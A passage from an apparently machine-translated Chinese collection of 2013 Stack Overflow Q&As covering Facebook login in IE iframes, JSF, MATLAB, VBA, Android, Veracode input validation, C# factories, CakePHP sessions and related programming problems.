      window.location = '/auth/facebook/callback?' + $.param({ signed_request: response.authResponse.signedRequest })
    } 
  }, {scope: 'email,publish_stream,publish_actions'});
}
</script> 
```

日志中没有错误或警报，一切都按预期工作。但是，如果我通过 Internet Explorer 在 Facebook iFrame 中登录，即使在回调阶段启动后它也不会登录。我想原来的问题已经解决了，但是当没有任何类型的错误消息时，我不知道如何调试它。

**问题**：当我使用 Internet Explorer 在 Facebook iFrame 中为我的应用程序单击“使用 Facebook 登录”时，授权过程完成后我没有登录。这个问题只发生在那个特定的环境中，我很难找出原因。

```
2013-02-22T01:10:40+00:00 app[web.1]: Started GET "/auth/facebook/callback?signed_request=LONGSTRING" for 200.1.102.103 at 2013-02-22 01:10:40 +0000
2013-02-22T01:10:40+00:00 app[web.1]: (facebook) Callback phase initiated.
2013-02-22T01:10:40+00:00 app[web.1]: Processing by SessionsController#create_facebook as HTML
2013-02-22T01:10:40+00:00 app[web.1]:   Parameters: {"signed_request"=>"LONGSTRING", "provider"=>"facebook"}
2013-02-22T01:10:40+00:00 app[web.1]:   User Load (1.6ms)  SELECT "users".* FROM "users" WHERE "users"."provider" = 'facebook' AND "users"."uid" = 'MYUID' LIMIT 1
2013-02-22T01:10:40+00:00 app[web.1]:    (0.8ms)  BEGIN
2013-02-22T01:10:40+00:00 app[web.1]:   User Exists (1.0ms)  SELECT 1 AS one FROM "users" WHERE ("users"."name" = 'MYNAME' AND "users"."id" != 3) LIMIT 1
2013-02-22T01:10:40+00:00 app[web.1]:    (0.9ms)  COMMIT
2013-02-22T01:10:40+00:00 app[web.1]: Redirected to http://MYAPP.COM
2013-02-22T01:10:40+00:00 app[web.1]: Completed 302 Found in 10ms (ActiveRecord: 4.2ms) 
```

同样，在任何其他环境中，授权在所有浏览器中都能完美运行。仅当我尝试**通过 Internet Explorer 在 Facebook 中登录**时才会出现此问题。

**我的环境**：omniauth-facebook 1.4.0、omniauth 1.1.1、oauth2 0.8.0、Rails 3.2.11

由于最新版本中的*凭据无效*错误，我故意将omniauth-facebook 从1.4.1 降级到1.4.0 。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-02T11:41:11.110

利用omniauth (1.1.3)、oauth2 (0.8.1) 和omniauth-facebook (1.4.1)。

这些不会有任何错误

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T14:43:19.513

`fastcatch`在[此](https://stackoverflow.com/questions/11120051/why-omniauthstrategiesfacebooknoauthorizationcodeerror-is-not-handled-in-o)SO 帖子中借助[从 omniauth-exceptions 获取更多信息](http://inside.oib.com/getting-more-information-from-omniauth-exceptions/)说，

`... OmniAuth strategies [...], if they encounter a problem, call the method fail! and pass in a symbol describing the problem like :invalid_credentials and the exception they encountered. The fail! method ends up calling OmniAuth.config.on_failure and passing in the Rack environment (after doing a few other things like sticking the exception into the environment...`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-08-12T15:07:13.787

因为您在使用 iframe 时仅在 Internet Explorer 中看到该问题，所以它可能是 P3P 问题。

请参阅[http://www.slideshare.net/cmercier/things-i-learned-writing-a-facebook-canvas-app](http://www.slideshare.net/cmercier/things-i-learned-writing-a-facebook-canvas-app) 和[Cookie 被阻止/未保存在 Internet Explorer 的 IFRAME 中](https://stackoverflow.com/questions/389456/cookie-blocked-not-saved-in-iframe-in-internet-explorer)：

> Internet Explorer 对 IFRAME 页面的信任级别较低（IE 将此称为“第三方”内容）。如果 IFRAME 内的页面没有隐私政策，则其 cookie 将被阻止（由状态栏中的眼睛图标指示，当您单击它时，它会显示被阻止的 URL 列表）。...在这种情况下，当 cookie 被阻止时，不会发送会话标识符，并且目标脚本会抛出“未找到会话”错误。

尝试添加[rack-p3p](https://github.com/hoopla/rack-p3p) gem，看看是否有帮助！

# java - jsf中可以显示的行数限制

> ID：14977196
> 
> 赞同：0
> 
> 时间：2013-02-20T10:11:09.567
> 
> 标签：java, mysql, jsf

我开发 jsf 应用程序。我有一个 MySQL Student 表，包含 30-40 列和 600 行。这是 StudentBean 中的代码：

```
@ManagedBean(name = "student")
@SessionScoped
public class StudentBean implements Serializable{

private List<Student> studentlist = new ArrayList<Student>();
private Student student = new Student();
private HtmlDataTable datatable;
private HtmlInputHidden studentnpm = new HtmlInputHidden();
private String querybynpm;
private String querybyangkatan;
private String status;
private String result;

public String init() {

    try {
        Class.forName(JurusanConection.getDriver());
    } catch (ClassNotFoundException e) {
        System.out.println(e.getMessage());
    }

    try {
        Connection con = DriverManager.getConnection(JurusanConection.getUrl(),
                JurusanConection.getUser_name(), JurusanConection.getPass_word());

        String query = "SELECT * FROM student";
        Statement ps = con.createStatement();
        ResultSet rs = ps.executeQuery(query);

        while (rs.next()) {
            Student students = new Student();
            students.setNpm(rs.getString("npm"));
            students.setNama(rs.getString("nama").toString());
            //setter and getter 
            students.setTanggalregistrasi(rs.getString("tanggalregistrasi").toString());
            students.setDosenwali(rs.getString("dosenwali").toString());
            students.setEmail(rs.getString("email"));
            students.setKelas(rs.getString("kelas"));
            studentlist.add(students);
        }
        result="mahasiswa";
        ps.close();
        con.close();

    } catch (SQLException e) {
        setResult(null);
        setStatus(e.getMessage());
    }
    return result;
} 
```

我没有通过构造函数填充数据库，而是调用了 init() 方法。我收到一条错误消息 javax.faces.el.E​​valuationException: java.lang.NullPointerException。但是，当我修改查询以限制 150 行显示的数量时，没有错误。任何人都可以弄清楚如何正确显示这 600 行。谢谢...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T12:21:08.733

您可能在以下不安全的代码行中收到 NullPointerExceptions：

```
rs.getString("nama").toString()
rs.getString("tanggalregistrasi").toString()
rs.getString("dosenwali").toString() 
```

这假设您的记录集中的这三列**永远不会**有空值。您应该将其分配给一个变量并在使用`.`运算符之前进行空检查。

此外，你为什么在这里调用 toString() ？ `ResultSet.getString`方法已经返回一个 String 对象。这是完全没有必要的。

# matlab - 如何在 Matlab 中生成以下矩阵 - 快速方法？

> ID：14977199
> 
> 赞同：0
> 
> 时间：2013-02-20T10:11:28.127
> 
> 标签：matlab, loops, matrix, generator

我有两个输入变量：

```
N=10;
M=4; 
```

使用 Matlab，我想为任何 M 和 N 生成以下矩阵 - 不使用 for 循环：

```
 %N = 1   2   3   4   5   6   7   8  9
Mat1 = [2,  3,  4,  5,  6,  7,  8,  9, 10;      %M=1 -> Mat1(1, i) = N(i)+1
        3,  6,  9, 12, 15, 18, 21, 27, 30;      %M=2 -> Mat1(2, i) = N(i)+N(i)*2
        4,  8, 12, 16, 20, 24, 28, 32, 36;      %M=3 -> Mat1(2, i) = N(i)+N(i)*3
        5, 10, 15, 20, 25, 30, 35, 40, 45]      %M=4 -> Mat1(2, i) = N(i)+N(i)*4

   %N = 1   2   3   4   5   6   7   8  9
Mat2 = [1, 2,  3,  4,  5,  6,  7,  8,  9;       %M=1 -> Mat2(2, i) = N(i)
        1, 4,  7, 10, 13, 16, 19, 25, 28;       %M=2 -> Mat2(2, i) = N(i)+N(i)*2-2
        1, 5,  9, 13, 17, 21, 25, 29, 33;       %M=3 -> Mat2(2, i) = N(i)+N(i)*3-3
        1, 6, 11, 16, 21, 26, 31, 36, 41]       %M=4 -> Mat2(2, i) = N(i)+N(i)*4-4 
```

> 一般说明：
> 
> ```
> % i=1:N
> 
> %Mat1(M, i) = N(i)+N(i)*M    , if M>1
> %             N(i)+1         , if M=1
> 
> %Mat2(M, i) = N(i)+N(i)*M-M  , if M>1
> %             N(i)           , if M=1 
> ```

我写了一个带有两个for循环的代码，但是我想问一下是否有任何方法可以得到这些结果，而不使用循环。我尝试使用`bsxfun`and `arrayfun`，但没有得到正确的结果：

```
clear Mat1 Mat2
N=10;
M=9;

Mat1 = ones(M, N);
Mat2 = ones(M, N);
for i=1:M
    for j=1:N
        if  i==1
            Mat1(i, j) = j+1;
            Mat2(i, j) = j;
        elseif j ==1  
            Mat1(i, j) = j+j*i;
        elseif i~=1 && j~=1
            Mat1(i, j) = j+j*i;
            Mat2(i, j) = j+j*i-i;
        end

    end
end 
```

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-21T10:34:13.987

我的尝试：

```
N=10;
M=4;
mat1 = bsxfun(@(x,y) x*(y.*(y>1)+1)+(y==1), 1:N,(1:M)')
mat2 = bsxfun(@(x,y) x*(y.*(y>1)+1)-(y>1).*y, 1:N,(1:M)') 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-21T09:36:31.497

同时我学会了如何使用`bsxfun`和`repmat`。我得到了 Mat1 和 Mat2 生成器的紧凑代码：

```
N=10;
M=4;

Mat1 = bsxfun(@times, (1:M)', (1:N)) +...
      [ones(1, N)  ;  horzcat(  ones(M-1,1) , repmat(2:N,M-1,1)   )   ];

Mat2 = [ones(M,1), [(2:N); bsxfun(@plus, (2:M)',(2:N)) +...
        horzcat(  zeros(M-1,1),  bsxfun(@times, (2:M)',(1:N-2))  )   ] ]; 
```

> 垫子1 =
> 
> ```
>  2     3     4     5     6     7     8     9    10    11
>  3     6     9    12    15    18    21    24    27    30
>  4     8    12    16    20    24    28    32    36    40
>  5    10    15    20    25    30    35    40    45    50 
> ```
> 
> 垫子2 =
> 
> ```
>  1     2     3     4     5     6     7     8     9    10
>  1     4     7    10    13    16    19    22    25    28
>  1     5     9    13    17    21    25    29    33    37
>  1     6    11    16    21    26    31    36    41    46 
> ```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-20T11:26:55.790

我认为这可能会满足您的需求：

第一个矩阵：

```
Mat1 = (2:N+1)'*(1:N);
Mat1 = Mat1(1:M,:);
Mat1(1,:) = 2:N+1; 
```

这给出 ( `N=10`, `M=4`)：

```
Mat1 =

 2     3     4     5     6     7     8     9    10    11
 3     6     9    12    15    18    21    24    27    30
 4     8    12    16    20    24    28    32    36    40
 5    10    15    20    25    30    35    40    45    50 
```

第二个矩阵：

```
tmp = (0:N-2)'*(1:N-1);
Mat2 = repmat((4:3:3*N),M-1,1) + tmp(1:M-1,:);
Mat2 = [ones(M,1), [2:N; Mat2]]; 
```

这使：

```
Mat2 =

 1     2     3     4     5     6     7     8     9    10
 1     4     7    10    13    16    19    22    25    28
 1     5     9    13    17    21    25    29    33    37
 1     6    11    16    21    26    31    36    41    46 
```

这有点令人困惑，因为构建这些矩阵的确切规则并不是很清楚。但是如果你想要的只是这些矩阵，这应该是一个快速的方法。

对于所有这些代码行`N`，`M`生成的矩阵与使用`for`循环编写的代码相同。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-20T11:59:32.637

我没有为每个测试用例都尝试过这些，所以我不确定它是否完全通用。我认为您应该能够调查我以前的做法，并得出第一个矩阵的解决方案。我认为您在上面的示例矩阵中可能有一些拼写错误，希望这会让您走上正轨

```
 M=4;
 N=10;

 Mat2=repmat([1:N],M,1);
 Mat2(2:M,:)=Mat2(2:M,:)+bsxfun(@times, Mat2(2:M,:), [2:M]');
 Mat2(2:M,:)=bsxfun(@minus, Mat2(2:M,:), [2:M]'); 
```

给我们：

```
Mat2 =

 1     2     3     4     5     6     7     8     9    10
 1     4     7    10    13    16    19    22    25    28
 1     5     9    13    17    21    25    29    33    37
 1     6    11    16    21    26    31    36    41    46 
```

M=5 和 N=10

```
Mat2 =

 1     2     3     4     5     6     7     8     9    10
 1     4     7    10    13    16    19    22    25    28
 1     5     9    13    17    21    25    29    33    37
 1     6    11    16    21    26    31    36    41    46
 1     7    13    19    25    31    37    43    49    55 
```

我认为这是 Mat1：

```
 Mat1=repmat([1:N],M,1);
 Mat1(2:M,:)=Mat1(2:M,:)+bsxfun(@times, Mat1(2:M,:), [2:M]');
 Mat1(1,:)=Mat1(1,:)+1;

Mat1 =

 2     3     4     5     6     7     8     9    10    11
 3     6     9    12    15    18    21    24    27    30
 4     8    12    16    20    24    28    32    36    40
 5    10    15    20    25    30    35    40    45    50 
```

# vba - 从可变长度的字符串中提取电子邮件地址

> ID：14977200
> 
> 赞同：0
> 
> 时间：2013-02-20T10:11:28.727
> 
> 标签：vba, outlook

如何从字符串中提取电子邮件地址？

> xxx my@email.com yyy

xxx 和 yyy 可以是任意长度，任意字符。电子邮件地址由空格分隔。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-20T12:25:00.437

一种可能：

```
sString = "my1@email.com xxx my2@email.com yyy my3@email.com"
asString = Split(sString, " ")
For i = 0 To UBound(asString)
    If asString(i) Like "*@*.*" Then
        sEmail = sEmail & "," & asString(i)
    End If
Next

MsgBox Mid(sEmail, 2) 
```

# android - 如何获取给定日期与先前记录日期之间的天数？

> ID：14977202
> 
> 赞同：1
> 
> 时间：2013-02-20T10:11:32.747
> 
> 标签：android, sqlite, android-sqlite

我有一个带有记录的 ListView，点击记录会打开一个详细的记录视图。在这个详细视图中，我想打印出当前记录和上一个记录之间的天数。我怎样才能做到这一点？

我知道存在一个获取最后插入的 id 的 SQLite 函数，但我看不出它在这里会有所帮助。

我正在考虑以这种方式解决它：

1.  获取详细视图中显示的当前记录的id
2.  获取日期并临时保存
3.  给定这个 id，写在当前 id 之前的记录的 id 是什么？
4.  给定上一条记录的 id，获取其日期并临时保存。
5.  计算详细视图中的当前记录与先前记录之间的天数。

所以，我想要的答案是：这个坦克用了 13 天。

实际上，我被困在上面的第 3 步，给定一个任意 id，我如何才能找出在该 id 之前存储在 db 中的记录对 id 有什么影响？

一个例子：

```
id  date  note
---------------------------
1   2013-01-03  first note
2   2013-01-13  second note
4   2013-01-20  ...
7   2013-02-01  ... 
```

如果我打开 id 为 4 的记录的详细视图，我想计算自写入 id 为 2 的记录以来的天数。即 2013-01-20 - 2013-01-13。

亲切的问候，拉蒙

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T10:14:57.967

您可以使用以下方法进行`date`操作：-

```
SimpleDateFormat formater=new SimpleDateFormat("yyyy-MM-dd");

long d1=formater.parse(date1Str).getTime();
long d2=formater.parse(date2Str).getTime();

System.out.println(Math.abs((d1-d2)/(1000*60*60*24))); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T10:20:41.213

你不应该通过身份证去。插入记录时插入时间戳。按时间戳获取记录顺序。

一旦您订购了数据，只需编写日期差异函数即可。

# java - 如何修复 Java Web 应用程序中的信任边界冲突漏洞

> ID：14977207
> 
> 赞同：2
> 
> 时间：2013-02-20T10:11:39.607
> 
> 标签：java, security, veracode

我收到来自 Veracode 的信任边界违规。我的代码是

```
userName= req.getParameter(Constant.USERNAME);
session.setAttribute(Constant.USERNAME, userName); //At this line i am getting Trust Boundry Violation flaw. 
```

如何验证`userName`以避免违反信任边界的缺陷？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-20T10:14:25.680

只需使用正则表达式根据您的用户名遵循的规则验证用户名：

```
if(userName.matches("[0-9a-zA-Z_]+")
     session.setAttribute(Constant.USERNAME, userName); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2017-09-26T15:55:06.993

VeraCode 将要求您向他们提交缓解措施。他们将安排与您的咨询，您可以在那里向他们展示已实施的代码修复，然后他们将标记缓解措施已批准。

是的，我知道这已经晚了，但其他人可能会绊倒，需要指出。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-08-19T02:30:14.903

当用户输入设置到会话中时会发生信任边界冲突。使用此漏洞，攻击者可以将任何其他用户名设置为会话，并可能导致假冒。访问用户名的任何地方的代码`session(session.getattribute)`都会赋予该用户的攻击者特权。

**缓解**：在将用户输入设置到会话之前，请确保设置到会话中的用户名是经过身份验证的用户。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-01-13T18:48:07.193

使用验证您的数据 `ESAPI.validator().getValidInput(...)`，然后将值设置为会话对象。

# visual-studio-2012 - Team Foundation Server 是 Visual Studio 2012 的替代品吗

> ID：14977211
> 
> 赞同：0
> 
> 时间：2013-02-20T10:11:45.583
> 
> 标签：visual-studio-2012, azure-devops

如果我购买 TFS，它将涵盖 Visual Studio 2012 的功能，例如创建项目、构建、编译。还是 TFS 主要是对 VS 的支持服务，给 VS 更多的协作和管理控制？最好的祝福

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-20T10:25:29.517

TFS (Team Foundation Server) 是应用程序生命周期管理 (ALM) 流程的工具。

它提供以下功能：

*   版本控制
*   需求管理
*   构建自动化
*   测试用例管理

它支持与 Visual Studio IDE 的完全集成，并提供用于团队 ALM 流程的协作和管理功能。

所以基本上，Visual Studio 是开发平台，而 TFS 是开发人员、测试人员、分析人员的多个实例的增强器和协作者，反之亦然。

TFS 不具备以下能力：开发、创建项目。

# android - 滚动视图中的权重

> ID：14977217
> 
> 赞同：0
> 
> 时间：2013-02-20T10:11:55.417
> 
> 标签：android, scrollview

在我的应用程序中，我试图创建一个滚动视图，它有 3 个填充整个屏幕的大按钮。所以每个按钮的大小都是屏幕的 1/3。我怎样才能做到这一点？当我使用权重时，它不起作用。

```
<ScrollView
    android:id="@+id/scrollView1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_above="@+id/imageView2"
    android:layout_alignParentLeft="true"
    android:layout_alignParentRight="true"
    android:layout_below="@+id/header_layout" >

    <TableLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:gravity="center_horizontal" >

        <TableRow
            android:id="@+id/tableRow1"
            android:layout_width="wrap_content"
            android:layout_height="0dp"
            android:layout_weight="1"
            android:gravity="center_horizontal" >

            <ImageView
                android:id="@+id/imageView3"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:src="@drawable/main_btn_call" />
        </TableRow>

        <TableRow
            android:id="@+id/tableRow2"
            android:layout_width="wrap_content"
            android:layout_height="0dp"
            android:layout_weight="1"
            android:gravity="center_horizontal" >

            <ImageView
                android:id="@+id/imageView4"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:src="@drawable/main_btn_unlock" />

        </TableRow>

        <TableRow
            android:id="@+id/tableRow3"
            android:layout_width="wrap_content"
            android:layout_height="0dp"
            android:layout_weight="1"
            android:gravity="center_horizontal" >

            <ImageView
                android:id="@+id/imageView5"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:src="@drawable/main_btn_push" />

        </TableRow>
    </TableLayout>

</ScrollView> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-05-22T06:07:24.717

唯一的变化是在您的 XML 中添加以下属性：

```
android:fillViewport="true" 
```

你的滚动视图宽度和高度应该是`match_parent`

```
android:layout_width="match_parent"
android:layout_height="match_parent" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-20T10:32:19.730

您正在使用`TableLayout`哪个`LinearLayout`方向设置为`vertical`- 到目前为止一切都很好，您在`layout_height`属性上使用权重。

我看到的问题是你`wrap_content`在你的`ScrollView`和你的`TableLayout`. 权重值允许您的视图扩展以填充可用空间，但您的父级将内容包装为 0 + 0 + 0。如果您将`match_parent`两个父元素的高度更改为，您的权重值将有扩展空间

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-20T10:52:50.123

我用代码来做到这一点：

```
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
    final ImageView incallImage = (ImageView) findViewById(R.id.incall_image);
    final ImageView unlockImage = (ImageView) findViewById(R.id.unlock_image);
    final ImageView pushImage = (ImageView) findViewById(R.id.push_image);
    final ScrollView scrollViewMain = (ScrollView) findViewById(R.id.scroll_view_main);
    scrollViewMain.post(new Runnable() {
        @Override
        public void run() {
            scrollMainHeight = scrollViewMain.getHeight();
            LinearLayout.LayoutParams layoutParams  = new    
                     LinearLayout.LayoutParams(LayoutParams.MATCH_PARENT, scrollMainHeight / 3);
            incallImage.setLayoutParams(layoutParams);
            unlockImage.setLayoutParams(layoutParams);
            pushImage.setLayoutParams(layoutParams);
        }
    });
} 
```

如果有人找到在 xml 中执行此操作的方法，那就太好了！谢谢！

# javascript - 无法提取部分字符串

> ID：14977219
> 
> 赞同：1
> 
> 时间：2013-02-20T10:11:56.043
> 
> 标签：javascript, regex

我有一个这样的字符串：`SPList:6E5F5E0D-0CA4-426C-A523-134BA33369D7?SPWeb:C5DD2ADA-E0C4-4971-961F-233789297FE9:`。

使用Javascript，我想提取两个ID（可以不同）：`6E5F5E0D-0CA4-426C-A523-134BA33369D7`和`C5DD2ADA-E0C4-4971-961F-233789297FE9`。

我正在使用这个正则表达式：`^SPList\:(?:[0-9A-Za-z\-]+)\?SPWeb\:(?:[0-9A-Za-z\-]+)\:$`。

我希望这个表达式能够将两个 ID 提取到两个匹配的组中。

到目前为止，我的代码是：

```
var input = "SPList:6E5F5E0D-0CA4-426C-A523-134BA33369D7?SPWeb:C5DD2ADA-E0C4-4971-961F-233789297FE9:";

var myregex = /^SPList\:(?:[0-9A-Za-z\-]+)\?SPWeb\:(?:[0-9A-Za-z\-]+)\:$/g;

var match = input.match(myregex);

var listId = match[0];
var webId = match[1]; 
```

但是，这并没有按预期工作。第一个匹配包含整个字符串，第二个匹配未定义。

提取我的 ID 的正确方法是什么？

这是一个说明我的问题的[jsfiddle 。](http://jsfiddle.net/cRSVc/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-20T10:30:55.903

这应该适合您的需求：

```
var regex = /^SPList:([0-9A-F-]+)[?]SPWeb:([0-9A-F-]+):$/g;
var match = regex.exec(input);
var listId = match[1];
var webId = match[2]; 
```

我只是通过捕获组替换了初始正则表达式的非捕获组，并使用`regex.exec(input)`而不是`input.match(regex)`获取捕获的数据。此外，由于 ID 似乎是十六进制值，因此我使用`A-F`了`A-Z`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-20T10:55:29.647

试试这个：

```
 var myregex = /[^\:]([0-9A-Z\-]+)[^\?|\:]/g;
        var match = input.match(myregex);
        alert("listID: " + match[1] + "\n" + "webID: " + match[3]); 
```

# java - 为使用 MySQL 和 SQLServer 的项目创建 uberjar

> ID：14977228
> 
> 赞同：4
> 
> 时间：2013-02-20T10:12:12.023
> 
> 标签：java, jdbc, jar, clojure, leiningen

我正在尝试在 clojure 中构建一个项目，该项目从 Microsoft SQL Server 数据库中获取数据，并将其推送到 MySQL 数据库。

该项目使用 lein run 运行良好，但是当我使用 leiningen 将其打包到一个 uberjar 中并使用 java -jar 运行它时，它失败了：

> 线程“主”java.sql.SQLException 中的异常：找不到适合 jdbc:sqlserver 的驱动程序....

此错误仅在我尝试同时使用 MySQL 数据库和 SQL Server 数据库时发生。如果我单独使用其中任何一个，则 jar 文件使用 java -jar 运行良好。

我的 project.clj 如下：

```
(defproject sqlserver-clojure "1.0.0-SNAPSHOT"
  :description "A minimal example of the MySQL/SQLServer conflict"
  :dependencies [[org.clojure/clojure "1.4.0"]
             [com.microsoft/sqljdbc4 "3.0"]
             [clojureql "1.0.4"]
             [mysql/mysql-connector-java "5.1.6"]]
  :main sqlserverclojure.core) 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-20T11:37:05.960

问题很可能是在制作 uber-jar 时，您没有复制`.properties`驱动程序所需的某些文件（例如 XML 配置），或者您正在覆盖两个 JDBC 驱动程序中存在的文件。

覆盖的一个很好的例子是`META-INF/services/java.sql.Driver`所有 JDBC 4 驱动程序都有的文件。此文件包含 jar 实现中所有类的列表`java.sql.Driver`，以便`java.sqlDriverManager`该类可以使用[`ServiceLoader`](http://docs.oracle.com/javase/7/docs/api/java/util/ServiceLoader.html).

如果您使用多个 JDBC 驱动程序创建一个 uber-jar，您需要确保该文件包含所有这些文件的联合，或者您的应用程序需要`Class.forName("<name of the java.sql.Driver implementation>")`为每个所需的驱动程序显式加载您需要的驱动程序，而不依赖于 JDBC 4 驱动程序自动加载。

Also verify that the process you use to create the uber-jar copies **all resources** and not just `.class` files!

Better yet (in my opinion), don't use an uber-jar, but keep the dependent `.jar` files external and reference them in the `Class-Path` entry of the `META-INF/MANIFEST.MF` file of your application, this saves you a lot of hassle to get your uber-jar working correctly (or verify that it is actually working correctly).

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-08-23T21:16:25.663

Adding this for my own reference since I've not touched Java before and struggle with Java interop.

Add

```
(. Class (forName "com.microsoft.sqlserver.jdbc.SQLServerDriver")) 
```

In the namespace with your jdbc clojure function calls.

# c# - 如何使类工厂创建所需的派生类

> ID：14977231
> 
> 赞同：4
> 
> 时间：2013-02-20T10:12:32.823
> 
> 标签：c#, inheritance, nested-class, class-factory

我经常使用类工厂模式，其中一个类有一个私有构造函数和一个静态方法来创建类。这允许由于某种原因无法构造类并返回 null 的情况 - 非常方便。

我希望能够将其扩展到工厂方法，该方法根据条件从派生类的层次结构中创建特定类。但是我看不到隐藏派生类的构造函数以强制使用工厂方法的方法。如果工厂方法在基类中，则它不再有权访问派生类的私有构造函数。在每个派生类中放置工厂方法是行不通的，因为必须事先知道所需的类型。如果一个类可以访问嵌套类的私有成员，则嵌套类可能是一种方式，但遗憾的是，嵌套类似乎可以访问封闭类的私有成员，但反之则不行。

有谁知道这样做的方法？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-20T10:23:16.920

有几种可能性，其中两种是：

1.  将所有这些类放在一个项目中并制作构造函数`internal`。其他项目将无法调用这些构造函数，但该项目中的代码可以。
2.  创建这些类的构造函数`protected`（而不是`private`），并在包含工厂方法的类中创建一个私有派生类。创建该私有类的实例并返回它。

第二个选项的示例：

```
public static class AnimalFactory
{
    public static Animal Create(int parameter)
    {
        switch(parameter)
        {
            case 0:
                return new DogProxy();
            case 1:
                return new CatProxy();
            default:
                throw new ArgumentOutOfRangeException("parameter");
        }
    }

    private class DogProxy : Dog { }

    private class CatProxy : Cat { }
}

public abstract class Animal { }

public class Dog : Animal
{
    protected Dog() { }
}

public class Cat : Animal
{
    protected Cat() { }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-20T10:24:24.077

这是丹尼尔发布答案时我正在处理的示例代码。看起来它正在按照他的建议做：

```
public static class BaseFactory
{
    public static Base Create(bool condition)
    {
        if (condition)
        {
            return Derived1.Create(1, "TEST");
        }
        else
        {
            return Derived2.Create(1, DateTime.Now);
        }
    }
}

public class Base
{
    protected Base(int value)
    {
    }

    protected static Base Create(int value)
    {
        return new Base(value);
    }
}

public sealed class Derived1: Base
{
    private Derived1(int value, string text): base(value)
    {
    }

    internal static Derived1 Create(int value, string text)
    {
        return new Derived1(value, text);
    }
}

public sealed class Derived2: Base
{
    private Derived2(int value, DateTime time): base(value)
    {
    }

    internal static Derived2 Create(int value, DateTime time)
    {
        return new Derived2(value, time);
    }
} 
```

[编辑] 对于丹尼尔的第二个建议：

```
public static class BaseFactory
{
    public static Base Create(bool condition)
    {
        if (condition)
        {
            return new Derived1Creator(1, "TEST");
        }
        else
        {
            return new Derived2Creator(1, DateTime.Now);
        }
    }

    private sealed class Derived1Creator: Derived1
    {
        public Derived1Creator(int value, string text): base(value, text)
        {
        }
    }

    private sealed class Derived2Creator: Derived2
    {
        public Derived2Creator(int value, DateTime time): base(value, time)
        {
        }
    }
}

public class Base
{
    protected Base(int value)
    {
    }

    protected static Base Create(int value)
    {
        return new Base(value);
    }
}

public class Derived1: Base
{
    protected Derived1(int value, string text): base(value)
    {
    }

    protected static Derived1 Create(int value, string text)
    {
        return new Derived1(value, text);
    }
}

public class Derived2: Base
{
    protected Derived2(int value, DateTime time): base(value)
    {
    }

    protected static Derived2 Create(int value, DateTime time)
    {
        return new Derived2(value, time);
    }
} 
```

请注意，不幸的是，第二种方法意味着无法密封类。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-20T10:21:26.617

不是将类本身内部的方法用作工厂，而是通过静态类（“工厂”）实现工厂模式，该类根据您编写的逻辑返回正确的实例。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-20T10:26:02.143

您可以在基类构造器中拦截派生类型的创建，并使用 StackFrames 检查调用者是否是您的工厂：

```
 protected Class1() //base class ctor
    {
        StackFrame[] stackFrames = new StackTrace().GetFrames(); 
        foreach (var frame in stackFrames)
        {
            //check caller and throw an exception if not satisfied
        }
    } 
```

# ios - 为 UITableView 的每个部分添加滚动功能

> ID：14977234
> 
> 赞同：0
> 
> 时间：2013-02-20T10:12:42.897
> 
> 标签：ios, uitableview

我正在浏览 WWDC 2010 中的 TVAnimationGestures 示例。如果我必须为 UITableView 的每个部分添加滚动条/支持滚动功能，如何实现？

例如，假设一个部分的每一行显示的内容足够宽，因此滚动“QuoteCell”的每个部分中的所有行。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T10:19:08.237

您应该创建一个自定义 UITableViewCell 并添加一个 UIScrollView ......就是这样！:-)

# cakephp - 奇怪的会话行为

> ID：14977235
> 
> 赞同：0
> 
> 时间：2013-02-20T10:12:51.000
> 
> 标签：cakephp, session-cookies

我们的一些访问者告诉我们，登录到我们的网站是不可能的。经过长时间的研究，我们发现会话似乎可能存在问题。看来，他们迷路了，甚至没有设置。

这是与蛋糕相关的问题，还是我们可以做些什么来避免我们网站的这种不良行为？我们已经在 core.php 中添加了以下会话设置：

```
Configure::write('Session', array('defaults' => 'php'));
Configure::write('Session.checkAgent', false);
Configure::write('Session.ini', array('session.cookie_secure' => false,'session.referer_check' => false));
Configure::write('Security.level', 'low');
Configure::write('Session.checkAgent', false);
Configure::write('Session.cookie_secure', false);
Configure::write('Session.referer_check', false);
Configure::write('Session.defaults', 'php');
Configure::write('Session.cookieTimeout', 0); 
```

最好的斯蒂芬

# sql - SQL Server 中的 JOIN/LEFT JOIN 冲突

> ID：14977238
> 
> 赞同：1
> 
> 时间：2013-02-20T10:13:04.133
> 
> 标签：sql, sql-server

我有一个棘手的问题。我需要选择管理员组的 2 类成员的所有最新版本。这是查询：

```
SELECT refGroup.*
